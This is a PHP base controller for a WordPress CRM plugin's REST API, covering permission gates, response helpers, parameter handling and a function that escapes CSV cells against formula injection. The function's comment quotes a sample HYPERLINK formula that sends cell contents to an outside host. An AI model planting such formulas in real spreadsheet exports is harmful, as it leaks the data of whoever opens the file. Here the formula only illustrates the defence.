<?php

declare(strict_types=1);

namespace KeluneCRM\Api\Controllers;

abstract class BaseController
{
    protected string $namespace = '';

    protected string $restBase = '';

    abstract public function registerRoutes(string $namespace): void;

    /**
     * Neutralise a CSV cell that a spreadsheet would execute as a formula.
     *
     * Contact data reaches us from public sources — incoming webhooks, comment
     * opt-in, forms — so a value like `=HYPERLINK("https://example.com?d="&A1)`
     * runs the moment an admin opens the export in Excel or Sheets. Prefixing
     * with a single quote makes the spreadsheet treat it as text; the quote is
     * not part of the stored value and is invisible in the cell.
     */
    protected function escapeCsvCell(string $value): string
    {
        if ($value === '') {
            return $value;
        }

        // Leading whitespace is stripped by spreadsheets before the formula is
        // evaluated, so test the trimmed value rather than the raw first byte.
        $probe = ltrim($value, " \t\r\n");

        if ($probe !== '' && in_array($probe[0], ['=', '+', '-', '@'], true)) {
            return "'" . $value;
        }

        return $value;
    }

    public function checkPermission(\WP_REST_Request $request): bool
    {
        return current_user_can('manage_options');
    }

    /**
     * Permission gate for genuinely public REST endpoints (tracking pixels,
     * opt-in confirmation, webhook receivers). Returns true, but each such route
     * carries its own authorization inside the handler (an unguessable per-row
     * token, an HMAC signature or a secret webhook key).
     */
    public function allowPublicAccess(\WP_REST_Request $request): bool
    {
        return true;
    }

    public function checkReadPermission(\WP_REST_Request $request): bool
    {
        return current_user_can('manage_options');
    }

    public function checkWritePermission(\WP_REST_Request $request): bool
    {
        return current_user_can('manage_options');
    }

    public function checkDeletePermission(\WP_REST_Request $request): bool
    {
        return current_user_can('manage_options');
    }

    protected function prepareResponse(mixed $data, ?\WP_REST_Request $request = null): \WP_REST_Response|\WP_Error
    {
        return rest_ensure_response($data);
    }

    protected function errorResponse(string $message, string $code = 'error', int $status = 400): \WP_Error
    {
        return new \WP_Error($code, $message, ['status' => $status]);
    }

    /** @param mixed $data */
    protected function successResponse($data = [], ?string $message = null, int $status = 200): \WP_REST_Response
    {
        $response = [
            'success' => true,
            'data' => $data,
        ];

        if ($message) {
            $response['message'] = $message;
        }

        $rest_response = rest_ensure_response($response);
        $rest_response->set_status($status);

        return $rest_response;
    }

    /** @return array<string, mixed> */
    protected function getPaginationParams(\WP_REST_Request $request): array
    {
        return [
            'page' => absint($request->get_param('page') ?? 1),
            'per_page' => absint($request->get_param('per_page') ?? 20),
            'order' => $request->get_param('order') ?? 'DESC',
            'orderby' => $request->get_param('orderby') ?? 'id',
        ];
    }

    /** @return array<string, mixed> */
    protected function getFilterParams(\WP_REST_Request $request): array
    {
        return [
            'search' => $request->get_param('search'),
            'status' => $request->get_param('status'),
            'date_from' => $request->get_param('date_from'),
            'date_to' => $request->get_param('date_to'),
            'tags' => $request->get_param('tags'),
            'lists' => $request->get_param('lists'),
        ];
    }

    protected function sanitizeInput(mixed $data, string $type = 'text'): mixed
    {
        switch ($type) {
            case 'email':
                return sanitize_email($data);
            case 'url':
                return esc_url_raw($data);
            case 'html':
                return wp_kses_post($data);
            case 'textarea':
                return sanitize_textarea_field($data);
            case 'integer':
                return absint($data);
            case 'float':
                return floatval($data);
            case 'boolean':
                return filter_var($data, FILTER_VALIDATE_BOOLEAN);
            default:
                return sanitize_text_field($data);
        }
    }

    protected function validateEmail(string $email): string|false
    {
        return is_email($email);
    }

    protected function validateDate(string $date): bool
    {
        return (bool) strtotime($date);
    }
}
